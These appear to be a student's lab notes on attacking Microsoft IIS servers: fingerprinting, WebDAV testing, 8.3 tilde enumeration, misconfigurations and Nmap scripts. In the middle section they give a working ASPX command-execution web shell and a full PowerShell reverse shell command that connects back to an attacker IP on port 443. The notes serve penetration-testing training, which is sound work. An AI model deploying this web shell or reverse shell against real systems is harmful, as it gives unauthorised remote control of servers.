# Web Server Attacks II

## Introduction

IIS - Internet Information Services (microsoft web server)
IIS is connected to other important Window services.

One of the attacks to the IIS was completed by Lazarus Group in 2023. They got initial access and distributed malware(AhnLab ASEC 2023)

## IIS fingerprint and enumeration

IIS web server version shows which CVE to apply.
WebDAV ---> direct file upload path.
HTTP methods that server accepts tells what operation is possible.

### IIS version and info

Many IIS web server users do not versions that are note secured.
IIS 6.0 - 10.0 (7.0, 7.5, 8.0, 8.5)

Look for IIS web server version CVE.

### IIS Architecture

There are layers in the IIS web server.

1. HTTP.sys
2. W3SVC/WAS
3. w3wp.exe
4. ASP/NET runtime/handler mappings
5. Application code

HTTP.sys - is a kernel mode driver that accept http traffic before other IIS process interacts with it.
Application pools --> run their own process w3wp.exe.

### HTTP Banner Grabber

IIS includes Server header for every response with product and version

command:

`curl -I http://MACHINE_IP`

output:

`HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Mon, 13 Apr 2026 14:05:52 GMT
Accept-Ranges: bytes
ETag: "d5e75da34ecbdc1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 25 Apr 2026 09:02:04 GMT`

Server ---> gives you version
X-Powered-By ---> gives you .Net application hosting
X-AspNet-Version ---> gives you the version of framework

### WebDAV Detection with OPTIONS

WebDAV ---> Web Distributed Authoring Versioning --- a set of extensions to the HTTP protocol.

HTTP OPTIONS methods helps you grab allowed methods

example:

command:

`curl -X OPTIONS http://Target_IP -sv 2>&1 | grep -E "Allow:|DAV:"`

output:

`Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
DAV: 1,2,3
`

### Testing what can be uploaded and run

PUT ---> test file.
GET ---> scan the response.

200 with output - your file is executed
200 without output - your file is served statically

command:

`curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://TARGET_IP/webdav/test.aspx
`
PUT aspx: 401

PUT in the answer says: no write access
Get in the answers says: confirms execution

### Normal vs Suspicious Traffic Patterns

HTTP methods: normal ---> GET POST HEAD /// dangerous ---> OPTIONS returning DAV: PUT MOVE PROPFIND

URl paths: normal ---> static assets /// containing ~ or aspx with writable directories

Status codes: 200, 304, 301, 302, 404 /// 201 or unexpected PUT and DELETE in logs

Server: PRESENT or expected version /// hides or old version of IIS

## IIS Tilde Enumeration

tilde enumeration - is an enumeration technique is the web server have hidden files or hidden admin directory.

### The 8.3 Short Filename Problem

Windows has 8.3 filename format which was inherited from the DOS.

Filename can have no more than 8 characters for name and additional 3 for extension.

BackupFiles becomes -> BACKUP~1
users_backup.xlsx -> USERS\*~1.xls

### How the vulnerability works

IIS will give different responds whether tilde path will be similar or not. detectable.

This technique is different to the bruteforce, as this technique will detect the path from first 6 letters and not from big and vague name.

The recommended mitigation is to disable 8.3 filename creation in the registry.

### Scanning with iis_shortname_scan.py

check the python folder to see iis_shortname_scan.py script.

command:

`python3 iis_shortname_scan.py TARGET_IP`

output:

`Server is vulnerable, please wait, scanning...
[+] /a~1._ [scan in progress]
[+] /b~1._ [scan in progress]
[+] /as~1._ [scan in progress]
[+] /ba~1._ [scan in progress]
[+] /asp~1._ [scan in progress]
[+] /bac~1._ [scan in progress]
[+] /aspn~1._ [scan in progress]
[+] /back~1._ [scan in progress]
[+] /aspne~1._ [scan in progress]
[+] /backu~1._ [scan in progress]
[+] /aspnet~1._ [scan in progress]
[+] /backup~1._ [scan in progress]
[+] /aspnet~1 [scan in progress]
[+] Directory /aspnet~1 [Done]
[+] /backup~1 [scan in progress]
[+] Directory /backup~1 [Done]

---

Dir: /aspnet~1
Dir: /backup~1

---

2 Directories, 0 Files found in total
Note that \* is a wildcard, matches any character zero or more times.`

The script works left to right. First is starts with a~1._ and b~1._ and then extends for one letter.

### What the Short Name Tells You

BACKUP~1/ --- Backup files, sensitive

ADMINI~1/ --- Admin panel, restricted access

CONFIG~1.ASP --- configurational files, can contain credentials

USERS~1.XLS --- User data export, high value target

After this the attacker will go for actual content of discovered resource

### Enumerating the Discovered Directory

After finding the directory scan for files:

`curl http://TARGET_IP/BackupFiles/`

output:

`<html><head><title>10.114.155.95 - /BackupFiles/</title></head><body><H1>10.114.155.95 - /BackupFiles/</H1><hr>

<pre><A HREF="/">[To Parent Directory]</A><br><br> 4/13/2026  2:25 PM           14 <A HREF="/BackupFiles/site-backup.cfg">site-backup.cfg</A><br> 4/25/2026 11:31 AM          168 <A HREF="/BackupFiles/web.config">web.config</A><br> 4/25/2026 11:04 AM           91 <A HREF="/BackupFiles/webdav_notes.txt">webdav_notes.txt</A><br></pre><hr></body></html>`

This command reveals /BackupFiles/webdav_notes.txt directory.

command:

`curl http://TARGET_IP/BackupFiles/webdav_notes.txt`

output:

`WebDAV setup notes
Directory: /webdav/
Username: webdav_user
Password: P@ssw0rd!123`

## WebDAV Exploitation: Uploading an ASPX shell

If WebDAV directory has writing and file execution permission, uploading an ASPX file and requesting it will give you code execution.

### 3 conditions for shell upload

1. WebDAV is enabled
2. Cred are valid with writing permission
3. Script execution is set

### Preparing the ASPX shell

Script for getting shell with aspx: (Remote code execution)

`<​%@ Page Language="C#" %​>
<​% 
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }
%​>`

This script is looks for word 'cmd' in the URL, and checks if the cmd variable is not empty.
Then it starts new cmd.exe program. Using /c flag script it passes users input string to the command line.
Finally the script shows output directly in the browser by using "pre" html tags.

### Uploading shell

IIS protects /webdav/ directory with Windows Authentication.

Anonymous users can only read "GET", other operations require valid identity.

--ntlm flag is for curl to know which protocol to use.

Success message is usually 201 Created. Means that file written to server.

## ASPX Web Shells

What is the aspx web shell?

ASPX web shells are ASP.NET file that run on the web server and accetps the attacker http requests and executes them as server processes.

the Application Pool ---> determines the priviliges and what shell could do.

### Execute command with shell

Using cmd.aspx the attacker can execute command within /webdav/ directory

command example:

`curl "http://TARGET_IP/webdav/cmd.aspx?cmd=whoami"`

### Escalate to a reverse shell

for more interactive access use rever shell.

First run netcat from your machine:

`nc -lvnp 443`

443 over 4444 because it is almost never blocked

Then powershell script must be used.

`powershell -NoP -NonI -W Hidden -Exec Bypass -c`
"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',443);`
$stream = $client.GetStream();`
[byte[]]$bytes = 0..65535|%{0};`
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){`
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);`
$sendback = (iex $data 2>&1 | Out-String );`
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};`
$client.Close()""
`

flags:

1. -NoP = skips powershell profile
2. -NoNI = runs noninteractively
3. -W Hidden = hides the window
4. -Exec Bypass = overrides "Restricted" execution default policy

Full Command:
`curl -G "http://10.112.146.163/webdav/cmd.aspx" \`

`--data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.112.106.4'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'`

Then check netcat for connection received message.

### Confirm Privileges in the Reverse Shell

whoami /priv ---> checking privileges for current account

output:

`PRIVILEGES INFORMATION

Privilege Name Description State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
SeAuditPrivilege Generate security audits Disabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled`

SeImpersonatePrivilege ---> one of most useful

ASPX shell on default IIS web server will give you predictable starting point.

## IIS Misconfigurations

Misconfigurations are one of the most common IIS attacks.

### Direcotry Listing Enabled

For this configuration IIS renders a file that should be returning 403 Forbidden Error.

Renders sensitive files, credentials, data.

Extension of files that should not be able to access: .bak, .config, .log, .zip, .sql

### HTTP PUT and Delete without authentication

`curl -X OPTIONS http://TARGET_IP/ -sv 2>&1 | grep "Allow:"`

Will reveal all possilbe header actions wihout authentication

### web.config exposure

web.config contain sensitive information(api keys, credentials, databases)

web.config by defualt is not accessible, but if the rule is removed or a MIME mapping is added incorrectly, the config file becomes downloadable

### Verbose Error Messages

Development mode in IIS will exposure the .NET stack traces.

In production mode the customErrors setting should be turned on.

This setting exposes: file paths, .NET framework version, failed queries, internal IP addresses.

### trace.axd Left Enabled

trace.axd is a built in ASP.NET dignostic handler.

Visiting http://target/trace.axd will return trace logs for recent activities.

Additional can expose session cookies and authentication tokens.

Should be disabled in the web.config.

### Trace method enabled

This setting could cause XST cross-site tracing attacks.

Was designed for loopback diagnostic testing.

`curl -X TRACE http://TARGET_MACHINE -sv`

### Application Pool Running as a Privileged Account

The default setting privilage is low-privilage (ApplicationPoolIdentity). But sometimes admins configure this settgin into default Administrator, SYSTEM.

## Automation

Nmap Scripting Engine allows to run multiple commands in one scan

### NSE Scripts for IIS

Nmap has a set of HTTP scripts:

1. http-methods ---> sends OPTIONS request
2. http-webdav-scan ---> checks for WebDAV support, takes DAV headers
3. http-iis-webdav-vuln ---> tests for IIS WebDAV auth bypass
4. http-ntlm-info ---> sends ntlm auth request and retrieves target info

### Service Version Detection

Nmap scan for available ports:

`nmap -sV -p 80 TARGET_IP`

### Enumerating HTTP Methods

http-methods checking OPTIONS request:

`nmap --script http-methods -p 80 TARGET_IP`

### Detecting WebDAV

`http-webdav-scan` is scanning for WebDAV by sending PROPFIND request and reading DAV response headers

`nmap --script http-webdav-scan -p 80 TARGET_IP`

Always check for Public Options cause the nmap version could be different.
